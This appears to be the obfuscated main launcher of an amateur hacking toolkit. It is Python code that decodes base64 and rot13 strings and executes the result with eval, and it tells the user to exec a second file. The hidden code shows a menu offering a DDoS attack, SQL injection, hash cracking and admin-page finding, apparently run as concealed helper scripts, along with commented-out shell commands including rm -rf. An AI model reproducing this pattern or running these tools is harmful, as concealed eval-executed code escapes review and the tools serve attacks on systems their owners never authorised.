#######################
#                     #
#        main         # MAIN FILE
#                     #
#####################################
exec((open('cntrl.py','r')).read()) #
#####################################
#                            #
#   CODER :  CRACKER911181   #
#                            #
##############################


 

import base64, codecs
magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiNvcy5zeXN0ZW0oInNoIHJlcXVpcmVtZW50LnNoIikKI29zLnN5c3RlbSgicm0gLXJmIHJlcXVpcmVtZW50LnNoIikKI29zLnN5c3RlbSgicm0gLXJmIF9fcHljYWNoZV9fIikKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKI2V4ZWMobWFyc2hhbC5sb2FkcyhiJ1x4ZmEmb3BwPW9wZW4oImxnLnB5IiwiciIpXG5leGVjKG9wcC5yZWFkKCkpJykpCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmRlZiB2b2ljZSgpOgoJdGV4dD1zdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb3VyIFRleHQ6ICIpKQoJd2hpbGUgVHJ1ZToKCQlsYW49c3RyKGlucHV0KHJvc3krIlxuRW50ZXIgWW91ciBMYW5ndWFnZShleGFtcGxlOiAnZW4vYm4nKTogIikpCgkJaWYgbGFuPT0iIiBvciBsYW49PSIgIjoKCQkJcHJpbnQocmVkKyJcblxuXHRMYW5ndWFnZSBOb3QgRGVuaWVkIikKCQllbHNlOgoJCQl2b2ljZT1nVFRTKHRleHQ9dGV4dCxsYW5nPWxhbikKCQkJZmlsZT1zdHIoaW5wdXQoIlxuRW50ZXIgWW91ciBGaWxlIE5hbWUgRm9yIHNhdmluZyhleGFtcGxlOiB0ZXN0Lm1wMyk6ICIpKQoJCQl3aGlsZSBUcnVlOgoJCQkJcGF0aD1zdHIoaW5wdXQocm9zeSsiXG5FbnRlciBZb3VyIFNhdmluZyBQYXRoOiAiKSkKCQkJCWlmIHBhdGg9PSIiIG9yIHBhdGg9PSIgIjoKCQkJCQlwcmludChyZWQrIlxuXG5cdFBhdGggTm90IERlbmllZCIpCgkJCQllbHNlOgoJCQkJCW1ucHQ9c3RyKHBhdGgrIi8iK2ZpbGUpCgkJCQkJdm9pY2Uuc2F2ZSh'
love = 'goaO0XDbXPtbXMTIzVUMwXPx6Pty3nTyfMFOHpaIyBtbWPKOlnJ50XTWfqJHeMvVvVtbtVPOsK19sVPNtVPNtVPNtVPNtVPNtVS8tVPNtVPNtVPNtVPNtVPNtK19sK18tVPNtVPNtVPNtVS8XVPNiVS9sK3ksVS9sVS9sVS8tVS9sK3jtsPOsK19sKlOsVS9sVPNtsS8tVPOssS9sVPNtK19sVUjtsNbtVvVvX2WfqJHeVvVvsPO8VPNtsPNaK18iVS9tVUjiVS9ssPO8YlNiVS8tKPNaK198K19sK3jtsP8tKlOpVP8tKlOpsPO8PvNvVvVepTImqPfvVvW8VUksK198VUjtsPNbK3jtsPNbK198VPNtCPNtK18iVUjtsS9sK19ssPO8VPusXFO8VPusXFO8VUjXVPOpK19sK3kssPNtKS9sYS98KS9sK3kssSksKS9sK3kssPNtVPNtVPO8K3kpK19sYlOpK19sY3kssSkhKT4tVvVvX2qlMJIhXlVvVvNtVPNtVPNtVPNtVPOQpzSwnlOMo3IlVSqipzkxYPOWMvOMo3HtD2ShKT5poyk0VPNtVPNtVPNtVPNvVvVeLzk1MFfvVvWo4cvSKFOWHPOHo29fVSivzVIqVSkhVvVvX2qlMJIhXlVvVvN9CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG0vVvVeL29fo3Ilo2MzXDbWPJAbo3AyCKA0pvucoaO1qPujMKA0XlWpoykhKUEpqQRhVRAioaMypaDtITI4qPOHolOJo2ywMIkhKUEpqPVepzIxXlVjZP5PLJAeVSEiVRuioJIpoykhVvglo3A5XlWSoaEypvOMo3IlVR9jqTyiowbtVvxcPtxXPDycMvOwnT9mMG09VwRvBtbWPDy2o2ywMFtcPtxWMJkcMvOwnT9mMG09VwNjVwbXPDxWLaWyLJfXPDxXPtbXPtbtPaqbnJkyVSElqJH6Ptyipl5mrKA0MJ0bW2AfMJSlWlxXPKOlnJ50XTWfqJHeMvVvVtbtVPOsK19sVPNtVPNtVPNtVPNtVPNtVS8tVPNtVPNtVPNtVPNtVPNtK19sK18tVPNtVPNtVPNtVS8XVPNiVS9sK3ksVS9sVS9sVS8tVS9sK3jtsPOsK19sKlOsVS9sVPNtsS8tVPOssS9sVPNtK19sVUjtsNbtVvVvX2WfqJHeVvVvsPO8VPNtsPNaK18iVS9tVUjiVS9ssPO8YlNiVS8tKPNaK198K19sK3jtsP8tKlOpVP8tKlOpsPO8PvNvVvVepTImqPfvVv'
god = 'J8IHxfX198IHwgfCAoX3wgfCAoX198ICAgPCAgX18vIHwgfF9fX19ffCB8IChfKSB8IChfKSB8IHwKICBcX19fX3xffCAgXF9fLF98XF9fX3xffFxfXF9fX3xffCAgICAgICB8X3xcX19fLyBcX19fL3xffFxuXG4gIiIiK2dyZWVuKyIiIiAgICAgICAgICAgICBDcmFjayBZb3VyIFdvcmxkLCBJZiBZb3UgQ2FuXG5cblx0XHQgICAgICAiIiIreWVsbG93KyIiIlZlcnNpb246IiIiK3JlZCsiIiIxLjIiIiIrY29sb3Vyb2ZmKQoJY2hvb3NlPXN0cihpbnB1dChwZXN0KyIiIlxuClx0fD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fApcdHwiIiIreWVsbG93KyIiIiAxLkNvbnRhY3QgSW5mbyIiIitwZXN0KyIiIiAgIDIuSVAgVG9vbCAgICAgICAgICAgfApcdHwgMy5EZG9zIEF0dGFjayAgICA0LlN1YmRvbWFpbiBTY2FubmVyIHwKXHR8IDUuQWRtaW4gRmluZGVyICAgNi5IYXMgQ3JhY2tlciAgICAgICB8Clx0fCA3LlZpZGVvIERvd25sb2FkZXIgICA4LkJEIENsb25lciAgICAgfApcdHwgOS5TUUwtSW5qZWN0aW9uICAxMC5UZXh0IFRvIFZvaWNlICAgIHwKXHR8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8Clx0fCAgICAgICAgICAgICIiIityZWQrIiIiICA5OS5FeGl0IiIiK3Blc3QrIiIiICAgICAgICAgICAgICAgICB8Clx0fD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fApcbiIiIityb3N5KyIiIkVudGVyIFlvdXIgT3B0aW9uOiAiIiIpKQoKCQoJaWYgY2hvb3NlPT0iOTkiOgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCXByaW50KHllbGxvdysiXG5cblxuXG5cblxuXHRcdPCfpKlUaGFua3MgRm9yIFVzaW5nIE15IFRvb2zwn6SpICAgXG5cblxuIikKCQlzeXMuZXhpdCgpCgkKCQoJZWxpZiBjaG9vc2U9PSIxIjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludChibHVlK2YiIiJcbgogICAgIHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT18CiAgI'
destiny = 'PNtsPNtVPNtVPNtVPNtVPNtVPNtVPOCI05SHvOWGxMCVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUjXVPNtVPO8CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09sNbtVPNtVUjtEzSwMJWio2ftsPObqUEjpmbiY3q3ql5zLJAyLz9inl5wo20iL3WuL2gypwxkZGR4ZFO8PvNtVPNtsPOHMJkyM3WuoFO8VTu0qUOmBv8iqP5gMF9wpzSwn2IlBGRkZGtkVPNtVPNtVPNtVPNtVUjXVPNtVPO8VRqcqRu1LvNtVUjtnUE0pUZ6Yl9anKEbqJVhL29gY2AlLJAeMKV5ZGRkBQRtVPNtVPNtsNbtVPNtVUj9CG09CG09CG09sQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG18PvVvVvxXPDbWPKEcoJHhp2kyMKNbAlxXPDbWMJkcMvOwnT9ip2H9CFVlVwbXPDyiom1ipTIhXPWcpP5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwZvBtbWPJ9iCJ9jMJ4bVzExo3ZhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV0VwbXPDyiom1ipTIhXPWmqJWxoF5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwHvBtbWPJ9iCJ9jMJ4bVzSxoJyhYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAvV6PtxWo289o3OyovtvnTSmYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAlV6PtxWo289o3OyovtvMT93ozkxYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vBPV6PtxWo289o3OyovtvL2kiozHhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV5VwbXPDyiom1ipTIhXPWmpJjgoJ4hpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkZPV6PtxWMaWioFOaqUEmVTygpT9lqPOaISEGPtxXPDyipl5mrKA0MJ0bW2AfMJSlWlxXPDy2LltcPtxWPtxWPDbWMJkcMvOwnT9mMG09VwNjVwbXPDyvpzIunj=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
